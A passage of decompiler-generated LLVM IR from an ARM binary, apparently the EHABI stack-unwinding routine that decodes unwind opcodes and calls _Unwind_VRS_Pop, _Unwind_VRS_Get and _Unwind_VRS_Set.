dec_label_pc_17a18:                               ; preds = %dec_label_pc_17a08
  %v1_17a18 = add nsw i32 %v4_17a08, -1
  store i32 %v1_17a18, i32* %r3.global-to-local, align 4
  %v1_17a1c = trunc i32 %v1_17a18 to i8
  store i8 %v1_17a1c, i8* %v2_17a08, align 1
  %v0_17a20 = load i32, i32* @r5, align 4
  %v1_17a20 = add i32 %v0_17a20, 4
  %v2_17a20 = inttoptr i32 %v1_17a20 to i32*
  %v3_17a20 = load i32, i32* %v2_17a20, align 4
  store i32 %v3_17a20, i32* %r2.global-to-local, align 4
  %v1_17a24 = inttoptr i32 %v3_17a20 to i32*
  %v2_17a24 = load i32, i32* %v1_17a24, align 4
  store i32 %v2_17a24, i32* %r0.global-to-local, align 4
  %v4_17a24 = add i32 %v3_17a20, 4
  store i32 %v4_17a24, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17a24, i32* %v2_17a20, align 4
  %v0_17a30 = load i32, i32* %r3.global-to-local, align 4
  %v1_17a30 = trunc i32 %v0_17a30 to i8
  %v2_17a30 = load i32, i32* @r5, align 4
  %v3_17a30 = add i32 %v2_17a30, 8
  %v4_17a30 = inttoptr i32 %v3_17a30 to i8*
  store i8 %v1_17a30, i8* %v4_17a30, align 1
  %v0_17a34 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a34 = load i32, i32* @r5, align 4
  %v2_17a34 = inttoptr i32 %v1_17a34 to i32*
  store i32 %v0_17a34, i32* %v2_17a34, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %.thread3, %dec_label_pc_17a18
  %v0_17a38 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a38, i32* %r3.global-to-local, align 4
  %v3_17a3c = mul i32 %v0_17a38, 256
  store i32 %v3_17a3c, i32* %r0.global-to-local, align 4
  %v1_17a40 = load i32, i32* @r5, align 4
  %v2_17a40 = inttoptr i32 %v1_17a40 to i32*
  store i32 %v3_17a3c, i32* %v2_17a40, align 4
  %v0_17a44 = load i32, i32* %r3.global-to-local, align 4
  %v3_17a44 = udiv i32 %v0_17a44, 16777216
  br label %dec_label_pc_17a48

dec_label_pc_17a48:                               ; preds = %dec_label_pc_17a08, %dec_label_pc_17a38
  %storemerge133 = phi i32 [ %v3_17a44, %dec_label_pc_17a38 ], [ 176, %dec_label_pc_17a08 ]
  %v1_17a48 = load i32, i32* %ip.global-to-local, align 4
  %v4_17a48 = mul i32 %v1_17a48, 256
  %v5_17a48 = or i32 %v4_17a48, %storemerge133
  store i32 %v5_17a48, i32* %r2.global-to-local, align 4
  %v7_17a4c = icmp eq i32 %v5_17a48, 32768
  store i1 %v7_17a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17a4c, label %dec_label_pc_17c58, label %dec_label_pc_17a54

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a48
  %v3_17a54 = mul i32 %v5_17a48, 16
  store i32 %v3_17a54, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17a64 = and i32 %v3_17a54, 65520
  store i32 %v3_17a64, i32* %r2.global-to-local, align 4
  %v0_17a68 = load i32, i32* @r7, align 4
  store i32 %v0_17a68, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_17a70 = call i32 @_Unwind_VRS_Pop(i32 %v0_17a68, i32 %v3_17a64, i32 0, i32 0)
  store i32 %v4_17a70, i32* %r0.global-to-local, align 4
  %v2_17a74 = icmp eq i32 %v4_17a70, 0
  store i1 %v2_17a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a74, label %dec_label_pc_17a7c, label %dec_label_pc_17c58

dec_label_pc_17a7c:                               ; preds = %dec_label_pc_17a54
  %v0_17a7c = load i32, i32* @r5, align 4
  %v1_17a7c = add i32 %v0_17a7c, 8
  %v2_17a7c = inttoptr i32 %v1_17a7c to i8*
  %v3_17a7c = load i8, i8* %v2_17a7c, align 1
  %v4_17a7c = zext i8 %v3_17a7c to i32
  store i32 %v4_17a7c, i32* %r3.global-to-local, align 4
  %v0_17a80 = load i32, i32* @r4, align 4
  %v1_17a80 = and i32 %v0_17a80, 32768
  %v2_17a80 = icmp eq i32 %v1_17a80, 0
  store i1 %v2_17a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a80, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_17a7c
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17a7c, %bb147
  %v2_17a88 = icmp eq i8 %v3_17a7c, 0
  store i1 %v2_17a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a88, label %dec_label_pc_17a98, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_17a8c = add nsw i32 %v4_17a7c, -1
  store i32 %v2_17a8c, i32* %r3.global-to-local, align 4
  %v2_17a90 = trunc i32 %v2_17a8c to i8
  store i8 %v2_17a90, i8* %v2_17a7c, align 1
  %v0_17a94.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17a94.pr.pr, label %.thread6.dec_label_pc_17a98_crit_edge, label %dec_label_pc_179c4

.thread6.dec_label_pc_17a98_crit_edge:            ; preds = %.thread6
  %v0_17a98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17a98

dec_label_pc_17a98:                               ; preds = %bb148, %.thread6.dec_label_pc_17a98_crit_edge
  %v0_17a98 = phi i32 [ %v0_17a98.pre, %.thread6.dec_label_pc_17a98_crit_edge ], [ %v0_17a7c, %bb148 ]
  %v1_17a98 = add i32 %v0_17a98, 9
  %v2_17a98 = inttoptr i32 %v1_17a98 to i8*
  %v3_17a98 = load i8, i8* %v2_17a98, align 1
  %v4_17a98 = zext i8 %v3_17a98 to i32
  store i32 %v4_17a98, i32* %r3.global-to-local, align 4
  %v2_17a9c = icmp eq i8 %v3_17a98, 0
  store i1 %v2_17a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a9c, label %dec_label_pc_17aa4, label %dec_label_pc_179a8

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_1799c, %dec_label_pc_179c4
  %v0_17aa4 = load i32, i32* @sl, align 4
  %v2_17aa4 = icmp eq i32 %v0_17aa4, 0
  store i1 %v2_17aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17aa4, label %dec_label_pc_17b6c, label %bb149

bb149:                                            ; preds = %dec_label_pc_17aa4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17ab0:                               ; preds = %bb149, %dec_label_pc_18020, %dec_label_pc_17ec0, %dec_label_pc_17ce4, %dec_label_pc_17c9c, %dec_label_pc_17c58, %dec_label_pc_17b6c
  %v1_17ab8 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18020 ], [ 9, %dec_label_pc_17ec0 ], [ 9, %dec_label_pc_17ce4 ], [ 9, %dec_label_pc_17c9c ], [ 9, %dec_label_pc_17c58 ], [ %v0_17ba0, %dec_label_pc_17b6c ]
  store i32 %v9_17974, i32* %r6.global-to-local, align 4
  store i32 %v21_17974, i32* @lr, align 4
  ret i32 %v1_17ab8

dec_label_pc_17abc:                               ; preds = %dec_label_pc_179e0
  %v1_17abc = mul i32 %v0_179e0, 4
  %v3_17ac0 = and i32 %v1_17abc, 252
  store i32 %v3_17ac0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17acc = load i32, i32* @r7, align 4
  store i32 %v0_17acc, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_17ad4 = add nuw nsw i32 %v3_17ac0, 4
  store i32 %v1_17ad4, i32* %r6.global-to-local, align 4
  %v5_17adc = call i32 @_Unwind_VRS_Get(i32 %v0_17acc, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_17ae0 = load i32, i32* @r4, align 4
  %v1_17ae0 = and i32 %v0_17ae0, 64
  %v2_17ae0 = icmp eq i32 %v1_17ae0, 0
  store i1 %v2_17ae0, i1* %cpsr_z.global-to-local, align 1
  %v4_17ae8 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17af4 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_17af4
  %storemerge160.p = select i1 %v2_17ae0, i32 %v2_17af4, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_17ae8
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_17b10 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17b10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17988.backedge

dec_label_pc_17988.backedge:                      ; preds = %dec_label_pc_17abc, %dec_label_pc_17b38, %dec_label_pc_17fbc, %dec_label_pc_17c88, %dec_label_pc_17cc0, %dec_label_pc_17c40, %dec_label_pc_17eac
  %v0_17988.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17988

dec_label_pc_17b18:                               ; preds = %dec_label_pc_179e8
  %v7_17b18 = icmp eq i32 %v1_179e8, 144
  store i1 %v7_17b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b18, label %dec_label_pc_17b20, label %dec_label_pc_17c60

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b18
  %v1_17b20 = urem i32 %v0_179e0, 16
  store i32 %v1_17b20, i32* %r2.global-to-local, align 4
  %v2_17b24 = icmp eq i32 %v1_17b20, 15
  store i1 %v2_17b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b24, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_17b20
  %v8_17b28 = icmp eq i32 %v1_17b20, 13
  store i1 %v8_17b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17b28, label %bb154, label %dec_label_pc_17b38

.thread21:                                        ; preds = %dec_label_pc_17b20
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c58

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c58

dec_label_pc_17b38:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17b44 = load i32, i32* @r7, align 4
  store i32 %v0_17b44, i32* %r0.global-to-local, align 4
  %v5_17b4c = call i32 @_Unwind_VRS_Get(i32 %v0_17b44, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17b54 = load i32, i32* @r7, align 4
  store i32 %v0_17b54, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_17b64 = call i32 @_Unwind_VRS_Set(i32 %v0_17b54, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17b64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17988.backedge

dec_label_pc_17b6c:                               ; preds = %dec_label_pc_17aa4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17b7c = load i32, i32* @r7, align 4
  store i32 %v0_17b7c, i32* %r0.global-to-local, align 4
  %v7_17b84 = call i32 @_Unwind_VRS_Get(i32 %v0_17b7c, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_17b88 = load i32, i32* @r7, align 4
  store i32 %v0_17b88, i32* %r0.global-to-local, align 4
  %v0_17b8c = load i32, i32* @sl, align 4
  store i32 %v0_17b8c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_17b8c, i32* %r3.global-to-local, align 4
  %v5_17b9c = call i32 @_Unwind_VRS_Set(i32 %v0_17b88, i32 %v0_17b8c, i32 15, i32 %v0_17b8c, i8* bitcast (i32* @0 to i8*))
  %v0_17ba0 = load i32, i32* @sl, align 4
  store i32 %v0_17ba0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17ba8:                               ; preds = %dec_label_pc_17d9c
  %v7_17ba8 = icmp eq i32 %v0_17d9c, 199
  store i1 %v7_17ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ba8, label %dec_label_pc_17e7c, label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17ba8
  %v1_17bb0 = and i32 %v0_179e0, 248
  store i32 %v1_17bb0, i32* %r3.global-to-local, align 4
  %v7_17bb4 = icmp eq i32 %v1_17bb0, 192
  store i1 %v7_17bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bb4, label %.thread24, label %dec_label_pc_17bcc

.thread24:                                        ; preds = %dec_label_pc_17bb0
  %v2_17bb8 = urem i32 %v0_179e0, 16
  %v2_17bbc = add nuw nsw i32 %v2_17bb8, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_17bc4 = or i32 %v2_17bbc, 655360
  store i32 %v2_17bc4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17bb0
  %v7_17bcc = icmp eq i32 %v0_17d9c, 200
  store i1 %v7_17bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bcc, label %dec_label_pc_17e10, label %dec_label_pc_17bd4

dec_label_pc_17bd4:                               ; preds = %dec_label_pc_17bcc
  %v7_17bd4 = icmp eq i32 %v0_17d9c, 201
  store i1 %v7_17bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bd4, label %dec_label_pc_17bdc, label %dec_label_pc_17c58

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bd4
  %v0_17bdc = load i32, i32* @r5, align 4
  %v1_17bdc = add i32 %v0_17bdc, 8
  %v2_17bdc = inttoptr i32 %v1_17bdc to i8*
  %v3_17bdc = load i8, i8* %v2_17bdc, align 1
  %v4_17bdc = zext i8 %v3_17bdc to i32
  store i32 %v4_17bdc, i32* %r3.global-to-local, align 4
  %v2_17be0 = icmp eq i8 %v3_17bdc, 0
  store i1 %v2_17be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17be0, label %dec_label_pc_17bf0, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_17bdc
  %v2_17be4 = add nsw i32 %v4_17bdc, -1
  store i32 %v2_17be4, i32* %r3.global-to-local, align 4
  %v2_17be8 = trunc i32 %v2_17be4 to i8
  store i8 %v2_17be8, i8* %v2_17bdc, align 1
  %v0_17bec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17bec.pr.pr, label %.thread26.dec_label_pc_17bf0_crit_edge, label %dec_label_pc_17c24

.thread26.dec_label_pc_17bf0_crit_edge:           ; preds = %.thread26
  %v0_17bf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %.thread26.dec_label_pc_17bf0_crit_edge, %dec_label_pc_17bdc
  %v2_17c08 = phi i32 [ %v0_17bf0.pre, %.thread26.dec_label_pc_17bf0_crit_edge ], [ %v0_17bdc, %dec_label_pc_17bdc ]
  %v1_17bf0 = add i32 %v2_17c08, 9
  %v2_17bf0 = inttoptr i32 %v1_17bf0 to i8*
  %v3_17bf0 = load i8, i8* %v2_17bf0, align 1
  %v4_17bf0 = zext i8 %v3_17bf0 to i32
  store i32 %v4_17bf0, i32* %r3.global-to-local, align 4
  %v2_17bf4 = icmp eq i8 %v3_17bf0, 0
  store i1 %v2_17bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17bf4, label %dec_label_pc_17c40, label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bf0
  %v1_17c04 = add nsw i32 %v4_17bf0, -1
  store i32 %v1_17c04, i32* %r3.global-to-local, align 4
  %v1_17c08 = trunc i32 %v1_17c04 to i8
  store i8 %v1_17c08, i8* %v2_17bf0, align 1
  %v0_17c0c = load i32, i32* @r5, align 4
  %v1_17c0c = add i32 %v0_17c0c, 4
  %v2_17c0c = inttoptr i32 %v1_17c0c to i32*
  %v3_17c0c = load i32, i32* %v2_17c0c, align 4
  store i32 %v3_17c0c, i32* %r2.global-to-local, align 4
  %v1_17c10 = inttoptr i32 %v3_17c0c to i32*
  %v2_17c10 = load i32, i32* %v1_17c10, align 4
  store i32 %v2_17c10, i32* %r0.global-to-local, align 4
  %v4_17c10 = add i32 %v3_17c0c, 4
  store i32 %v4_17c10, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17c10, i32* %v2_17c0c, align 4
  %v0_17c1c = load i32, i32* %r3.global-to-local, align 4
  %v1_17c1c = trunc i32 %v0_17c1c to i8
  %v2_17c1c = load i32, i32* @r5, align 4
  %v3_17c1c = add i32 %v2_17c1c, 8
  %v4_17c1c = inttoptr i32 %v3_17c1c to i8*
  store i8 %v1_17c1c, i8* %v4_17c1c, align 1
  %v0_17c20 = load i32, i32* %r0.global-to-local, align 4
  %v1_17c20 = load i32, i32* @r5, align 4
  %v2_17c20 = inttoptr i32 %v1_17c20 to i32*
  store i32 %v0_17c20, i32* %v2_17c20, align 4
  br label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %.thread26, %dec_label_pc_17c04
  %v0_17c24 = load i32, i32* %r0.global-to-local, align 4
  %v3_17c24 = udiv i32 %v0_17c24, 16777216
  %v1_17c28 = urem i32 %v3_17c24, 16
  %v3_17c2c = mul i32 %v0_17c24, 256
  %v1_17c30 = add nuw nsw i32 %v1_17c28, 1
  store i32 %v1_17c30, i32* %r1.global-to-local, align 4
  %v1_17c34 = and i32 %v3_17c24, 240
  store i32 %v1_17c34, i32* %r3.global-to-local, align 4
  %v1_17c38 = load i32, i32* @r5, align 4
  %v2_17c38 = inttoptr i32 %v1_17c38 to i32*
  store i32 %v3_17c2c, i32* %v2_17c38, align 4
  %v0_17c3c = load i32, i32* %r1.global-to-local, align 4
  %v1_17c3c = load i32, i32* %r3.global-to-local, align 4
  %v4_17c3c = mul i32 %v1_17c3c, 4096
  %v5_17c3c = or i32 %v4_17c3c, %v0_17c3c
  br label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %dec_label_pc_17bf0, %dec_label_pc_17c24
  %storemerge = phi i32 [ %v5_17c3c, %dec_label_pc_17c24 ], [ 720897, %dec_label_pc_17bf0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_17c40 = load i32, i32* @r7, align 4
  store i32 %v0_17c40, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_17c4c = call i32 @_Unwind_VRS_Pop(i32 %v0_17c40, i32 1, i32 5, i32 5)
  store i32 %v4_17c4c, i32* %r0.global-to-local, align 4
  %v2_17c50 = icmp eq i32 %v4_17c4c, 0
  store i1 %v2_17c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c50, label %dec_label_pc_17988.backedge, label %dec_label_pc_17c58

dec_label_pc_17c58:                               ; preds = %dec_label_pc_17ea4, %dec_label_pc_17bd4, %dec_label_pc_17cb4, %dec_label_pc_18058, %dec_label_pc_18028, %dec_label_pc_18004, %dec_label_pc_17e90, %dec_label_pc_17c40, %dec_label_pc_17a54, %dec_label_pc_17a48, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17b18
  %v7_17c60 = icmp eq i32 %v1_179e8, 160
  store i1 %v7_17c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c60, label %dec_label_pc_17c68, label %dec_label_pc_17ca4

dec_label_pc_17c68:                               ; preds = %dec_label_pc_17c60
  %v0_17c68 = load i32, i32* %ip.global-to-local, align 4
  %v1_17c68 = urem i32 %v0_17c68, 8
  %v1_17c6c = xor i32 %v1_17c68, 7
  store i32 %v1_17c6c, i32* %r3.global-to-local, align 4
  %v6_17c74 = lshr i32 4080, %v1_17c6c
  %v1_17c78 = and i32 %v0_179e0, 8
  %v2_17c78 = icmp eq i32 %v1_17c78, 0
  store i1 %v2_17c78, i1* %cpsr_z.global-to-local, align 1
  %v1_17c7c = and i32 %v6_17c74, 4080
  %tmp155 = mul nuw nsw i32 %v1_17c78, 2048
  %tmp156 = or i32 %v1_17c7c, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17c88:                               ; preds = %.thread44, %.thread24, %dec_label_pc_18018.dec_label_pc_17c88_crit_edge, %bb157, %dec_label_pc_17e74, %dec_label_pc_17e08, %dec_label_pc_17d68, %dec_label_pc_17c68
  %v2_17c90 = phi i32 [ %v2_17d8c, %.thread44 ], [ %v2_17d94, %bb157 ], [ %v2_17c90.pre, %dec_label_pc_18018.dec_label_pc_17c88_crit_edge ], [ %v2_17bc4, %.thread24 ], [ %storemerge130, %dec_label_pc_17e74 ], [ %storemerge131, %dec_label_pc_17e08 ], [ %storemerge132, %dec_label_pc_17d68 ], [ %tmp156, %dec_label_pc_17c68 ]
  %v0_17c8c = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_18018.dec_label_pc_17c88_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_17e74 ], [ 3, %dec_label_pc_17e08 ], [ 1, %dec_label_pc_17d68 ], [ 0, %dec_label_pc_17c68 ]
  %v0_17c88 = load i32, i32* @r7, align 4
  store i32 %v0_17c88, i32* %r0.global-to-local, align 4
  store i32 %v0_17c8c, i32* %r3.global-to-local, align 4
  %v4_17c90 = call i32 @_Unwind_VRS_Pop(i32 %v0_17c88, i32 %v0_17c8c, i32 %v2_17c90, i32 %v0_17c8c)
  store i32 %v4_17c90, i32* %r0.global-to-local, align 4
  %v2_17c94 = icmp eq i32 %v4_17c90, 0
  store i1 %v2_17c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c94, label %dec_label_pc_17988.backedge, label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c88
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17ca4:                               ; preds = %dec_label_pc_17c60
  %v7_17ca4 = icmp eq i32 %v1_179e8, 176
  store i1 %v7_17ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ca4, label %dec_label_pc_17cec, label %dec_label_pc_17cac

dec_label_pc_17cac:                               ; preds = %dec_label_pc_17ca4
  %v7_17cac = icmp eq i32 %v1_179e8, 192
  store i1 %v7_17cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cac, label %dec_label_pc_17d9c, label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17cac
  %v1_17cb4 = and i32 %v0_179e0, 248
  store i32 %v1_17cb4, i32* %r3.global-to-local, align 4
  %v7_17cb8 = icmp eq i32 %v1_17cb4, 208
  store i1 %v7_17cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cb8, label %dec_label_pc_17cc0, label %dec_label_pc_17c58

dec_label_pc_17cc0:                               ; preds = %dec_label_pc_17cb4
  %v1_17cc0 = urem i32 %v0_179e0, 8
  %v1_17cc4 = add nuw nsw i32 %v1_17cc0, 1
  %v1_17cc8 = or i32 %v1_17cc4, 524288
  store i32 %v1_17cc8, i32* %r2.global-to-local, align 4
  %v0_17ccc = load i32, i32* @r7, align 4
  store i32 %v0_17ccc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_17cd8 = call i32 @_Unwind_VRS_Pop(i32 %v0_17ccc, i32 1, i32 %v1_17cc8, i32 5)
  store i32 %v4_17cd8, i32* %r0.global-to-local, align 4
  %v2_17cdc = icmp eq i32 %v4_17cd8, 0
  store i1 %v2_17cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17cdc, label %dec_label_pc_17988.backedge, label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cc0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17ca4
  %v0_17cec = load i32, i32* %ip.global-to-local, align 4
  %v7_17cec = icmp eq i32 %v0_17cec, 177
  store i1 %v7_17cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cec, label %dec_label_pc_17ff0, label %dec_label_pc_17cf4

dec_label_pc_17cf4:                               ; preds = %dec_label_pc_17cec
  %v7_17cf4 = icmp eq i32 %v0_17cec, 178
  store i1 %v7_17cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cf4, label %dec_label_pc_17ec8, label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cf4
  %v7_17cfc = icmp eq i32 %v0_17cec, 179
  store i1 %v7_17cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cfc, label %dec_label_pc_17d04, label %dec_label_pc_17d70

dec_label_pc_17d04:                               ; preds = %dec_label_pc_17cfc
  %v0_17d04 = load i32, i32* @r5, align 4
  %v1_17d04 = add i32 %v0_17d04, 8
  %v2_17d04 = inttoptr i32 %v1_17d04 to i8*
  %v3_17d04 = load i8, i8* %v2_17d04, align 1
  %v4_17d04 = zext i8 %v3_17d04 to i32
  store i32 %v4_17d04, i32* %r3.global-to-local, align 4
  %v2_17d08 = icmp eq i8 %v3_17d04, 0
  store i1 %v2_17d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d08, label %dec_label_pc_17d18, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_17d04
  %v2_17d0c = add nsw i32 %v4_17d04, -1
  store i32 %v2_17d0c, i32* %r3.global-to-local, align 4
  %v2_17d10 = trunc i32 %v2_17d0c to i8
  store i8 %v2_17d10, i8* %v2_17d04, align 1
  %v0_17d14.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17d14.pr.pr, label %.thread30.dec_label_pc_17d18_crit_edge, label %dec_label_pc_17d4c

.thread30.dec_label_pc_17d18_crit_edge:           ; preds = %.thread30
  %v0_17d18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d18

dec_label_pc_17d18:                               ; preds = %.thread30.dec_label_pc_17d18_crit_edge, %dec_label_pc_17d04
  %v2_17d30 = phi i32 [ %v0_17d18.pre, %.thread30.dec_label_pc_17d18_crit_edge ], [ %v0_17d04, %dec_label_pc_17d04 ]
  %v1_17d18 = add i32 %v2_17d30, 9
  %v2_17d18 = inttoptr i32 %v1_17d18 to i8*
  %v3_17d18 = load i8, i8* %v2_17d18, align 1
  %v4_17d18 = zext i8 %v3_17d18 to i32
  store i32 %v4_17d18, i32* %r3.global-to-local, align 4
  %v2_17d1c = icmp eq i8 %v3_17d18, 0
  store i1 %v2_17d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d1c, label %dec_label_pc_17d68, label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %dec_label_pc_17d18
  %v1_17d2c = add nsw i32 %v4_17d18, -1
  store i32 %v1_17d2c, i32* %r3.global-to-local, align 4
  %v1_17d30 = trunc i32 %v1_17d2c to i8
  store i8 %v1_17d30, i8* %v2_17d18, align 1
  %v0_17d34 = load i32, i32* @r5, align 4
  %v1_17d34 = add i32 %v0_17d34, 4
  %v2_17d34 = inttoptr i32 %v1_17d34 to i32*
  %v3_17d34 = load i32, i32* %v2_17d34, align 4
  store i32 %v3_17d34, i32* %r2.global-to-local, align 4
  %v1_17d38 = inttoptr i32 %v3_17d34 to i32*
  %v2_17d38 = load i32, i32* %v1_17d38, align 4
  store i32 %v2_17d38, i32* %r0.global-to-local, align 4
  %v4_17d38 = add i32 %v3_17d34, 4
  store i32 %v4_17d38, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17d38, i32* %v2_17d34, align 4
  %v0_17d44 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d44 = trunc i32 %v0_17d44 to i8
  %v2_17d44 = load i32, i32* @r5, align 4
  %v3_17d44 = add i32 %v2_17d44, 8
  %v4_17d44 = inttoptr i32 %v3_17d44 to i8*
  store i8 %v1_17d44, i8* %v4_17d44, align 1
  %v0_17d48 = load i32, i32* %r0.global-to-local, align 4
  %v1_17d48 = load i32, i32* @r5, align 4
  %v2_17d48 = inttoptr i32 %v1_17d48 to i32*
  store i32 %v0_17d48, i32* %v2_17d48, align 4
  br label %dec_label_pc_17d4c

dec_label_pc_17d4c:                               ; preds = %.thread30, %dec_label_pc_17d2c
  %v0_17d4c = load i32, i32* %r0.global-to-local, align 4
  %v3_17d4c = udiv i32 %v0_17d4c, 16777216
  %v1_17d50 = urem i32 %v3_17d4c, 16
  %v3_17d54 = mul i32 %v0_17d4c, 256
  store i32 %v3_17d54, i32* %r0.global-to-local, align 4
  %v1_17d58 = add nuw nsw i32 %v1_17d50, 1
  store i32 %v1_17d58, i32* %r2.global-to-local, align 4
